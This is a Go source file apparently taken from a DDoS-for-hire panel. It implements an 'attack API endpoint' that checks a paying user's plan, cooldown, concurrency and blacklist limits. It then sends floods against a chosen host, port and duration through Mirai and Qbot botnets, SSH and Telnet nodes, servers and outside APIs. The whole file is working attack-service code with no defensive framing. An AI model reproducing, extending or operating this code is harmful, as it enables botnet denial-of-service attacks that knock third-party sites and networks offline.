package api

import (
	"Manager/assets"
	"Manager/database"
	"fmt"
	"io"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"
)

var badStrings = []string{"%20", "%0a", "%0d"}
var replace = []string{"%3A", "%2F"}
var replaceStr = []string{":", "/"}

func StartPage(w http.ResponseWriter, r *http.Request) {
	database.LogRequests("==== [ ATTACK API ENDPOINT ] ====")
	database.LogRequests("IP: " + r.RemoteAddr)
	database.LogRequests("Method: " + r.Method)
	database.LogRequests("User-Agent: " + r.UserAgent())
	database.LogRequests("Full URL: " + r.URL.String())
	database.LogRequests("Query: " + r.URL.RawQuery)
	database.LogRequests(fmt.Sprintf("Content-Length: %s", r.Header.Get("Content-Length")))
	database.LogRequests(fmt.Sprintf("Content-Type: %s", r.Header.Get("Content-Type")))
	database.LogRequests(fmt.Sprintf("Referer: %s", r.Header.Get("Referer")))
	database.LogRequests(fmt.Sprintf("Origin: %s", r.Header.Get("Origin")))
	database.LogRequests("=================================")
	username := r.URL.Query().Get(strings.ToLower("username"))
	key := r.URL.Query().Get(strings.ToLower("key"))
	host := r.URL.Query().Get(strings.ToLower("host"))
	port := r.URL.Query().Get(strings.ToLower("port"))
	duration := r.URL.Query().Get(strings.ToLower("time"))
	method := r.URL.Query().Get(strings.ToLower("method"))
	host = strings.ReplaceAll(host, replace[0], replaceStr[0])
	host = strings.ReplaceAll(host, replace[1], replaceStr[1])

	if !database.Authenticate(username, key) {
		w.WriteHeader(http.StatusForbidden)
		_, err := fmt.Fprintf(w, "Login failed")
		database.CheckError(err)
		return
	}
	if strings.Contains(host, " ") || strings.Contains(host, "*") || strings.Contains(host, "\"") || strings.Contains(host, "|") {
		w.WriteHeader(http.StatusBadRequest)
		_, err := fmt.Fprintf(w, "Bad characters")
		database.CheckError(err)
		return
	}
	if !database.CheckInt(port) || !database.CheckInt(duration) {
		w.WriteHeader(http.StatusBadRequest)
		_, err := fmt.Fprintf(w, "Bad characters")
		database.CheckError(err)
		return
	}

	if host == "" || port == "" || duration == "" || method == "" {
		w.WriteHeader(http.StatusBadRequest)
		_, err := fmt.Fprintf(w, "Missing parameters")
		database.CheckError(err)
		return
	}

	for _, str := range badStrings {
		if strings.Contains(r.URL.String(), str) {
			w.WriteHeader(http.StatusBadRequest)
			_, err := fmt.Fprintf(w, "Bad string")
			database.CheckError(err)
			return
		}
	}

	if !database.CheckWhitelist(r.RemoteAddr) {
		w.WriteHeader(http.StatusForbidden)
		_, err := fmt.Fprintf(w, "Your IP is not whitelisted")
		database.CheckError(err)
		return
	}

	dur, err := strconv.Atoi(duration)
	if database.CheckError(err) {
		w.WriteHeader(http.StatusBadRequest)
		_, err := fmt.Fprintf(w, "Invalid time")
		database.CheckError(err)
		return
	}

	if database.CheckExpiry(username) {
		w.WriteHeader(http.StatusForbidden)
		_, err := fmt.Fprintf(w, "Your account is expired")
		database.CheckError(err)
		return
	}

	if dur > database.Config.MaxTime {
		w.WriteHeader(http.StatusBadRequest)
		_, err := fmt.Fprintf(w, "Time bigger than allowed")
		database.CheckError(err)
		return
	}

	user := database.GetUser(username)
	if user.HasCooldown {
		w.WriteHeader(http.StatusForbidden)
		_, err := fmt.Fprintf(w, "You are on cooldown")
		database.CheckError(err)
		return
	}

	if database.CheckBlacklist(host) && strings.ToLower(user.Plan) != "admin" {
		w.WriteHeader(http.StatusForbidden)
		_, err := fmt.Fprintf(w, "Host is blacklisted")
		database.CheckError(err)
		return
	}

	if user.Banned > 0 {
		w.WriteHeader(http.StatusForbidden)
		_, err := fmt.Fprintf(w, "You are banned")
		database.CheckError(err)
		return
	}

	if user.MaxTime < dur {
		w.WriteHeader(http.StatusBadRequest)
		_, err := fmt.Fprintf(w, "Time is too long")
		database.CheckError(err)
		return
	}

	methodStruct := database.GetMethod(method)

	if methodStruct.Type == "Layer4" {
		if !database.CheckIP(host) {
			w.WriteHeader(http.StatusBadRequest)
			_, err := fmt.Fprintf(w, "Host is not an IP")
			database.CheckError(err)
			return
		}
	}

	if methodStruct.Type == "Layer7" {
		if database.CheckIP(host) {
			w.WriteHeader(http.StatusBadRequest)
			_, err := fmt.Fprintf(w, "Host is a Domain")
			database.CheckError(err)
			return
		}
	}

	if len(methodStruct.ASN) > 0 {
		if !database.CheckASN(host, methodStruct.ASN) {
			w.WriteHeader(http.StatusBadRequest)
			_, err := fmt.Fprintf(w, "Method not allowed on this IP/Domain")
			database.CheckError(err)
			return
		}
	}

	if methodStruct.Name == "" {
		w.WriteHeader(http.StatusBadRequest)
		_, err := fmt.Fprintf(w, "Method not found")
		database.CheckError(err)
		return
	}

	if methodStruct.Time < dur {
		w.WriteHeader(http.StatusBadRequest)
		_, err := fmt.Fprintf(w, "Method time exceeded")
		database.CheckError(err)
		return
	}

	if !database.CheckPlan(user.Plan, methodStruct.Plan) {
		w.WriteHeader(http.StatusForbidden)
		_, err := fmt.Fprintf(w, "Method not allowed on your plan")
		database.CheckError(err)
		return
	}

	if database.MethodSlotsFull(methodStruct) {
		w.WriteHeader(http.StatusForbidden)
		_, err := fmt.Fprintf(w, "Method currently full")
		database.CheckError(err)
		return
	}

	targetPort, err := strconv.Atoi(port)
	if database.CheckError(err) {
		w.WriteHeader(http.StatusBadRequest)
		_, err := fmt.Fprintf(w, "Invalid port")
		database.CheckError(err)
		return
	}

	if len(database.Config.BlacklistedPort) > 0 {
		for _, v := range database.Config.BlacklistedPort {
			if v == port {
				w.WriteHeader(http.StatusBadRequest)
				_, err := fmt.Fprintf(w, "Port is blacklisted")
				database.CheckError(err)
				return
			}
		}
	}

	if database.Config.HostCooldownEnabled {
		for _, v := range database.HostCooldown {
			if v == host {
				w.WriteHeader(http.StatusForbidden)
				_, err := fmt.Fprintf(w, "Host is on cooldown")
				database.CheckError(err)
				return
			}
		}
	}

	if database.Config.Debug {
		if strings.ToLower(user.Username) != "admin" {
			w.WriteHeader(http.StatusForbidden)
			_, err := fmt.Fprintf(w, "Debug mode is enabled")
			database.CheckError(err)
			return
		}
	}

	for i, v := range database.Concurrents.Running {
		if v.User.Username == user.Username {
			if !database.Config.Powersaving {
				if v.Con < user.Concurrent {
					database.Concurrents.Running[i].Con = database.Concurrents.Running[i].Con + 1
					database.Concurrents.Running[i].Targets = append(database.Concurrents.Running[i].Targets, host)
					go func() {
						time.Sleep(time.Duration(dur) * time.Second)
						database.Concurrents.Running[i].Con = database.Concurrents.Running[i].Con - 1
						database.Concurrents.Running[i].Targets = remove(database.Concurrents.Running[i].Targets, host)
					}()
					if database.Config.Debug {
						database.Info("Concurrent: " + username)
						database.Info(database.Concurrents.Running[i].Targets)
						database.Info(database.Concurrents.Running[i].Con)
					}
					break
				} else {
					w.WriteHeader(http.StatusForbidden)
					_, err := fmt.Fprintf(w, "You are already attacking the maximum amount of targets")
					database.CheckError(err)
					return
				}
			} else {
				if v.Con < user.Concurrent {
					for _, v := range database.Concurrents.Running {
						for _, t := range v.Targets {
							if t == host {
								w.WriteHeader(http.StatusForbidden)
								_, err := fmt.Fprintf(w, "Target is already being attacked")
								database.CheckError(err)
								return
							}
						}
					}
					database.Concurrents.Running[i].Con = database.Concurrents.Running[i].Con + 1
					database.Concurrents.Running[i].Targets = append(database.Concurrents.Running[i].Targets, host)
					go func() {
						time.Sleep(time.Duration(dur) * time.Second)
						database.Concurrents.Running[i].Con = database.Concurrents.Running[i].Con - 1
						database.Concurrents.Running[i].Targets = remove(database.Concurrents.Running[i].Targets, host)
					}()
					if database.Config.Debug {
						database.Info("Concurrent: " + username)
						database.Info(database.Concurrents.Running[i].Targets)
						database.Info(database.Concurrents.Running[i].Con)
					}
					break
				} else {
					w.WriteHeader(http.StatusForbidden)
					_, err := fmt.Fprintf(w, "You are already attacking the maximum amount of targets")
					database.CheckError(err)
					return
				}
			}
		}
	}

	if database.GetActiveCons() > database.Config.MaxCons {
		w.WriteHeader(http.StatusForbidden)
		_, err := fmt.Fprintf(w, "Global Concurrent limit reached")
		database.CheckError(err)
		return
	}

	if database.Config.HostCooldownEnabled {
		database.HostCooldown = append(database.HostCooldown, host)
		go func() {
			time.Sleep(time.Duration(database.Config.HostCooldown) * time.Second)
			database.HostCooldown = remove(database.HostCooldown, host)
		}()
	}
	go database.Info(fmt.Sprintf("User %s sent attack to %s:%s for %s seconds using %s", username, host, port, duration, method))
	go database.SendLog(fmt.Sprintf("**USER ATTACK SENT SUCCESSFULLY**\r\n\r\n**Username**: \r\n%s\r\n**Target**: \r\n%s\r\n**Port**: \r\n%s\r\n**Duration**: \r\n%s\r\n**Method**: \r\n%s\r\n**Threads**:\r\n %d\r\n**Time Sent**: \r\n%s\r\n**User Conns**:\r\n %s / %s\r\n**Remote IP**: \r\n%s", user.Username, host, port, duration, method, user.Threads, time.Now().Format("02-01-2006 15:04:05"), strconv.Itoa(database.GetActiveConsUser(user.Username)), strconv.Itoa(user.Concurrent), r.RemoteAddr))

	go database.StartCooldown(user)
	go database.SendAPIs(methodStruct, host, targetPort, dur, user)
	go database.SendServers(methodStruct, host, targetPort, dur, user)
	go database.SendNets(methodStruct, host, targetPort, dur, user)
	go database.SendQbots(methodStruct, host, port, duration, user)
	go database.SendMirai(methodStruct, host, port, duration)
	go database.AddAttack(host, targetPort, method, dur, username)
	w.WriteHeader(http.StatusOK)
	if database.DetectHTML(readAttack(user, host, port, duration, method)) {
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
	} else {
		w.Header().Set("Content-Type", "text/plain; charset=utf-8")
	}
	_, err = fmt.Fprintf(w, readAttack(user, host, port, duration, method))
	database.CheckError(err)
}

func readAttack(user assets.User, host string, port string, duration string, method string) string {
	file, err := os.Open("config/attack.tmpl")
	database.CheckError(err)
	defer func(file *os.File) {
		err := file.Close()
		database.CheckError(err)
	}(file)
	html, err := io.ReadAll(file)
	database.CheckError(err)
	myAttacks := 0
	for _, attack := range database.Attacks {
		if attack.User == user.Username {
			myAttacks++
		}
	}
	totalInterface := len(database.Mirai) + len(database.Qbots) + len(database.Nets.SSHs) + len(database.Servers.Servers) + len(database.GetMethod(method).Gateway.APIs) + len(database.Nets.Telnets)
	site := strings.NewReplacer("[BotCount]", strconv.Itoa(len(database.Mirai)+len(database.Qbots)), "[Host]", host, "[Threads]", strconv.Itoa(user.Threads), "[MyAttacks]", strconv.Itoa(myAttacks), "[Port]", port, "[Time]", duration, "[Method]", method, "[Concurrents]", strconv.Itoa(database.GetActiveConsUser(user.Username)), "[MaxConcurrents]", strconv.Itoa(user.Concurrent), "[APIs]", strconv.Itoa(len(database.GetMethod(method).Gateway.APIs)), "[SSHs]", strconv.Itoa(len(database.Nets.SSHs)), "[Telnets]", strconv.Itoa(len(database.Nets.Telnets)), "[TotalInterface]", strconv.Itoa(totalInterface)).Replace(string(html))
	return site
}

func remove(targets []string, target string) []string {
	for i, v := range targets {
		if v == target {
			return append(targets[:i], targets[i+1:]...)
		}
	}
	return targets
}
